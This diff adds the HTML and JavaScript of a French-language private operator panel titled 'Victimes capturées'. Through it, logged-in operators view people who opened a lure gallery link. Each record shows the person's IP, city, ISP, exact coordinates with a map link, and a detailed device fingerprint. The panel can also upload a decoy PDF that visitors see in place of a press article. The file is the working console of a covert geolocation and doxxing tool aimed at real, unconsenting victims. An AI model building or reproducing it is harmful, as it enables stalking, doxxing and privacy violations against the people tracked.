@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Consolas,sans-serif}
+body{background:#0e1116;color:#dce3ea;min-height:100vh}
+#login{max-width:380px;margin:14vh auto;padding:28px;background:#161b24;border:1px solid #26303c;border-radius:14px}
+#login h2{margin-bottom:4px;font-size:17px;color:#7fa2c7}
+#login p{font-size:12px;color:#66788c;margin-bottom:18px}
+#pass{width:100%;padding:11px 12px;background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;border-radius:8px;font-size:15px;outline:none}
+button{margin-top:12px;width:100%;padding:11px;background:#2b6cb0;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
+button:hover{background:#2f7cc9}
+#lerr{color:#e07a7a;font-size:13px;margin-top:10px;min-height:16px}
+#app{max-width:1180px;margin:0 auto;padding:18px}
+header#bar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:16px}
+h1{font-size:19px;color:#7fa2c7}
+.cnt{background:#1d2733;padding:4px 12px;border-radius:20px;font-size:13px;color:#9db4cc}
+.tools{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+#q{background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;padding:9px 12px;border-radius:8px;width:230px;font-size:13px}
+#flush{background:#a03c3c;padding:9px 14px;font-size:13px;width:auto;margin:0}
+label.auto{font-size:12px;color:#7d92a8;display:flex;gap:6px;align-items:center}
+table{width:100%;border-collapse:collapse;background:#12161d;border-radius:10px;overflow:hidden;font-size:13px}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #1e2631;white-space:nowrap}
+th{background:#1a212b;color:#7fa2c7;font-weight:600;font-size:12px;cursor:pointer}
+tr.row{cursor:pointer}
+tr.row:hover{background:#171d27}
+tr.open{background:#1a2230}
+td.badge{font-size:11px;padding:3px 9px;border-radius:10px}
+.bg-ok{background:#1d3c2a;color:#7ed7a1}
+.bg-no{background:#3c2530;color:#d99ba6}
+#detail{background:#12161d;border:1px solid #243040;border-radius:12px;margin-top:14px;padding:20px;display:none}
+#detail h3{color:#7fa2c7;font-size:15px;margin:16px 0 8px;border-bottom:1px solid #232e3b;padding-bottom:6px}
+#detail h3:first-child{margin-top:0}
+.kv{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px}
+.kv div{background:#0e1318;border:1px solid #1e2833;border-radius:8px;padding:8px 10px;font-size:12px}
+.kv b{display:block;color:#5f7d9c;font-size:10px;letter-spacing:.6px;text-transform:uppercase;font-weight:600}
+pre{background:#0a0d11;border:1px solid #1e2833;border-radius:8px;padding:12px;font-size:11px;overflow-x:auto;color:#93a8bd;max-height:260px;overflow-y:auto}
+a.maps{color:#5ea9e6}
+.empty{padding:40px;text-align:center;color:#5c7085}
+.bait{background:#12161d;border:1px solid #243040;border-radius:12px;padding:14px 16px;margin-bottom:14px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:10px}
+.baitL{display:flex;flex-direction:column;gap:3px}
+.baitL b{color:#7fa2c7;font-size:14px}
+#baitState{font-size:12px;color:#8a9fb5}
+.baitR{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.baitR button{margin:0;width:auto;padding:8px 12px;font-size:12px}
+.ghost{background:#233041 !important}
+#baitDel{background:#5c2f2f !important}
+#baitName{font-size:12px;color:#66788c;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#baitMsg{width:100%;font-size:12px;min-height:14px;color:#8a9fb5}
+@media(max-width:720px){th,td{padding:8px}#q{width:100%}}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <h2>Panel privé</h2>
+  <p>Accès restreint. Session valable 8h.</p>
+  <input id="pass" type="password" placeholder="Mot de passe" autofocus>
+  <button onclick="doLogin()">Se connecter</button>
+  <div id="lerr"></div>
+</div>
+
+<div id="app" style="display:none">
+  <header id="bar">
+    <div style="display:flex;gap:10px;align-items:center">
+      <h1>Victimes capturées</h1>
+      <span class="cnt" id="cnt">0</span>
+    </div>
+    <div class="tools">
+      <input id="q" placeholder="Recherche IP / modèle..." oninput="render()">
+      <button id="flush" onclick="flushAll()">Tout effacer</button>
+      <label class="auto"><input type="checkbox" id="auto" checked onchange="startAuto()"> auto 30s</label>
+    </div>
+  </header>
+
+  <div class="bait">
+    <div class="baitL"><b>Leurre PDF</b><span id="baitState">—</span></div>
+    <div class="baitR">
+      <input type="file" id="pdf" accept="application/pdf" style="display:none">
+      <button class="ghost" onclick="document.getElementById('pdf').click()">Choisir un PDF</button>
+      <span id="baitName">aucun fichier choisi</span>
+      <button onclick="uploadBait()">Téléverser comme leurre</button>
+      <button id="baitDel" onclick="deleteBait()" style="display:none">Retirer le leurre</button>
+    </div>
+    <div id="baitMsg"></div>
+  </div>
+
+  <table id="tbl">
+    <thead><tr>
+      <th onclick="sort('t')">Heure ▾</th>
+      <th onclick="sort('ip')">IP</th>
+      <th>Ville / Wilaya</th>
+      <th>FAI</th>
+      <th onclick="sort('dev')">Appareil</th>
+      <th>Précision</th>
+    </tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+  <div id="empty" class="empty" style="display:none">Aucune capture. Envoie le lien galerie et attends.</div>
+
+  <div id="detail"></div>
+</div>
+
+<script>
+const DOXY='/api/v1/doxy', DATA='/api/v1/dataview', DOC='/api/v1/doc';
+let list=[], opened=null, curSort='t', asc=false, baitMeta=null;
+
+async function P(u,o){try{const r=await fetch(u,o);return r.ok&&r.status!==204?await r.json():null}catch(e){return null}}
+
+async function doLogin(){
+  const p=document.getElementById('pass').value;
+  const j=await P(DOXY,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({p:p})});
+  if(j){document.getElementById('login').style.display='none';document.getElementById('app').style.display='block';load();startAuto()}
+  else{document.getElementById('lerr').textContent='Accès refusé';}
+}
+
+async function load(){
+  const j=await P(DATA);
+  if(!j){document.getElementById('login').style.display='block';document.getElementById('app').style.display='none';return}
+  list=j.sessions||[];
+  baitMeta=j.bait||null;
+  baitRender();
+  document.getElementById('cnt').textContent=list.length;
+  const has=list.length>0;
+  document.getElementById('tbl').style.display=has?'table':'none';
+  document.getElementById('empty').style.display=has?'none':'block';
+  render();
+}
+
+function sort(k){if(curSort===k)asc=!asc;else{curSort=k;asc=false};render()}
+
+function geoTxt(s){
+  const g=s.geo||{};
+  if(!g||g.err)return '—';
+  const a=[g.city,g.region,g.country].filter(Boolean).join(' / ');
+  return a||'—';
+}
+function ispTxt(s){const g=s.geo||{};return g.isp||g.org||'—'}
+function devTxt(s){
+  const m=s.y||s.br||s.u||'—';
+  return m.length>34?m.slice(0,34)+'…':m;
+}
+function precS(s){
+  const g=s.geo||{};
+  if(g&&!g.err&&g.lat!==null&&g.lat!==undefined&&g.lat!=='')return '<span class="badge bg-ok">lat/lon</span>';
+  if(g&&!g.err)return '<span class="badge bg-no">ville</span>';
+  return '<span class="badge bg-no">—</span>';
+}
+function fmtT(t){try{const d=new Date(t);return d.toLocaleDateString('fr-FR')+' '+d.toLocaleTimeString('fr-FR')}catch(e){return t||'—'}}
+
+function render(){
+  const q=document.getElementById('q').value.toLowerCase();
+  let arr=list.filter(s=>JSON.stringify(s).toLowerCase().includes(q));
+  arr.sort((a,b)=>{const x=curSort==='dev'?(devTxt(a)+'').toLowerCase():String(sel(a,curSort)||''),y=curSort==='dev'?(devTxt(b)+'').toLowerCase():String(sel(b,curSort)||'');return asc?x.localeCompare(y):y.localeCompare(x)});
+  document.getElementById('rows').innerHTML=arr.map(s=>rowHtml(s,s.x===opened)).join('');
+}
+function sel(s,k){return s[k]}
+
+function rowHtml(s,open){
+  return `<tr class="row ${open?'open':''}" onclick="toggle('${s.x}')">
+    <td>${fmtT(s.t)}</td>
+    <td>${s.ip||'—'}</td>
+    <td>${geoTxt(s)}</td>
+    <td>${ispTxt(s)}</td>
+    <td>${devTxt(s)}</td>
+    <td>${precS(s)}</td>
+  </tr>${open?detailHtml(s):''}`;
+}
+
+function toggle(x){opened=(opened===x)?null:x;render();
+  if(opened){const d=document.getElementById('detail');if(d&&d.style.display==='block'){d.scrollIntoView({behavior:'smooth',block:'start'})}}
+}
+
+function fld(label,val){return `<div><b>${label}</b>${val===''||val===undefined||val===null?'—':val}</div>`}
+
+function detailHtml(s){
+  const g=s.geo||{};
+  let maps='—';
+  if(g.lat!=null&&g.lon!=null&&g.lat!==''&&g.lon!==''&&!g.err){
+    maps=`<a class="maps" target="_blank" href="https://maps.google.com/?q=${g.lat},${g.lon}">${g.lat}, ${g.lon}</a>`;
+  }
+  const prec=(g.lat!=null&&!g.err&&g.lat!=='')?'Exact (lat/lon)':'Ville/region approx (IP)';
+  return `<td colspan="6" style="white-space:normal"><div id="detail" style="display:block">
+    <h3>Localisation (${prec})</h3>
+    <div class="kv">
+      ${fld('coords',maps)}
+      ${fld('ville',g.city)}
+      ${fld('region',g.region)}
+      ${fld('pays',g.country)}
+      ${fld('code postal',g.zip)}
+      ${fld('fai',g.isp)}
+      ${fld('org',g.org)}
+      ${fld('asn',g.asn)}
+    </div>
+    <h3>Appareil</h3>
+    <div class="kv">
+      ${fld('modele',s.y)}
+      ${fld('android',s.av)}
+      ${fld('navigateur',s.br)}
+      ${fld('gpu',s.g)}
+      ${fld('gpu vendor',s.n2)}
+      ${fld('ram (GB)',s.m)}
+      ${fld('cpu cores',s.c)}
+      ${fld('ecran',s.s)}
+      ${fld('viewport',s.v)}
+      ${fld('pixel ratio',s.d)}
+      ${fld('profondeur couleur',s.cd)}
+      ${fld('touch points',s.t)}
+      ${fld('batterie',s.bt)}
+      ${fld('stockage (MB)',s.st)}
+      ${fld('peripheriques media',s.q)}
+    </div>
+    <h3>Réseau & session</h3>
+    <div class="kv">
+      ${fld('connexion',s.k)}
+      ${fld('downlink',s.dl)}
+      ${fld('en ligne',s.n)}
+      ${fld('timezone',s.z)}
+      ${fld('offset',s.o)}
+      ${fld('langue',s.l)}
+      ${fld('langues',s.ls)}
+      ${fld('referrer',s.r)}
+      ${fld('plateforme',s.p)}
+      ${fld('fingerprint canvas',s.f)}
+    </div>
+    <h3>User-agent complet</h3>
+    <pre>${esc(s.u)}</pre>
+    <h3>Enregistrement brut (JSON)</h3>
+    <pre>${esc(JSON.stringify(s,null,2))}</pre>
+  </div></td>`;
+}
+function esc(t){return String(t==null?'':t).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
+
+async function flushAll(){
+  if(!confirm('Effacer toutes les captures ?'))return;
+  await P(DATA,{method:'POST',headers:{'Content-Type':'application/json'},body:'{"f":1}'});
+  await load();
+}
+
+function baitRender(){
+  const s=document.getElementById('baitState'), d=document.getElementById('baitDel');
+  if(baitMeta){
+    s.textContent=(baitMeta.n||'document.pdf')+' — '+(baitMeta.sz?Math.round(baitMeta.sz/1024)+' Ko':'')+' — '+fmtT(baitMeta.t)+' — actif';
+    d.style.display='inline-block';
+  }else{
+    s.textContent='Aucun leurre — l’article de presse sert de page d’accueil';
+    d.style.display='none';
+  }
+}
+function toB64(f){
+  return new Promise((ok,no)=>{
+    const r=new FileReader();
+    r.onload=()=>ok(String(r.result).split(',')[1]||'');
+    r.onerror=no;
+    r.readAsDataURL(f);
+  });
+}
+async function uploadBait(){
+  const f=document.getElementById('pdf').files[0];
+  const msg=document.getElementById('baitMsg');
+  msg.style.color='#8a9fb5';
+  if(!f){msg.textContent='Choisis d’abord un fichier PDF.';return}
+  if(f.size>3200000){msg.style.color='#e07a7a';msg.textContent='PDF trop gros (max ~3 Mo).';return}
+  msg.textContent='Téléversement...';
+  const b64=await toB64(f);
+  const j=await P(DOC,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({n:f.name,b:b64})});
+  if(j&&j.ok){
+    msg.style.color='#7ed7a1';
+    msg.textContent='Leurre actif. Les visiteurs verront ce PDF.';
+    baitMeta=j.meta||{n:f.name,sz:f.size,t:new Date().toISOString()};
+    baitRender();
+  }else{
+    msg.style.color='#e07a7a';
+    msg.textContent='Échec — PDF invalide, trop gros pour l’API, ou stockage non configuré.';
+  }
+}
+async function deleteBait(){
+  if(!confirm('Retirer le leurre PDF ?'))return;
+  await P(DOC,{method:'DELETE'});
+  baitMeta=null;
+  baitRender();
+  document.getElementById('baitMsg').textContent='';
+}
+document.getElementById('pdf').addEventListener('change',e=>{
+  const f=e.target.files[0];
+  document.getElementById('baitName').textContent=f?f.name:'aucun fichier choisi';
+});
+
+let timer=null;
+function startAuto(){
+  if(timer)clearInterval(timer);
+  if(document.getElementById('auto').checked){timer=setInterval(load,30000)}
+}
+document.getElementById('pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
+</script>
+</body>
+</html>
